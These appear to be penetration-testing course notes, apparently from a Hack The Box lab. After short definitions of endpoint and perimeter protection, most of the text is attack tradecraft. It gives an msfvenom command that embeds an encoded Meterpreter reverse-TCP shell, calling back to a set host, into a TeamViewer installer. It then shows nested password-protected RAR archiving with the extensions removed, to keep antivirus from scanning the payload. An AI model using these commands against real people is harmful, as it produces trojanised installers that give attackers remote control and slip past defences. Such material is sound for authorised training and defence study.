
## Endpoint protection
- Localised device whose sole purpose is to protect a single host on the network.
- Usually comes in software packs which include `AV`, `Antimalware Protection`, `Firewall`, `Anti-DDOS` all under the same s/w package.

## Perimeter protection
- physical or virtualized devices on the network perimeter edge.
- These edge devices provide access inside of the network from outside. ie.. pubic to private.

## Security Policies

- Essentially a list of allow and deny statements that dictate how traffic or files can exist within a network boundary.
## Embedding payloads into any executable files

```shell-session
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

- To improve our chances, we need to trigger the continuation of the normal execution of the launched application while pulling the payload in a separate thread from the main application. We do so with the `-k` flag as it appears above.

## Archiving the Payload
- Archiving the payload and protecting the payload with a password can prevent AV detection to an extend.
- AV's won't be able to scan the payload, but it may raise notifications saying that `AV was not able to scan the password prprotected file.`
```shell-session
HrithikManoj000@htb[/htb]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
HrithikManoj000@htb[/htb]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
HrithikManoj000@htb[/htb]$ rar a ~/test.rar -p ~/test.js

Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test.rar
Adding    test.js                                                     OK 
Done
```

#### Removing the .RAR Extension

```
mv test.rar test
```

#### Archiving the Payload Again

```shell-session
HrithikManoj000@htb[/htb]$ rar a test2.rar -p test

Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test2.rar
Adding    test                                                        OK 
Done
```

#### Removing the .RAR Extension
```shell-session
HrithikManoj000@htb[/htb]$ mv test2.rar test2
HrithikManoj000@htb[/htb]$ ls

test   test2   test.js
```

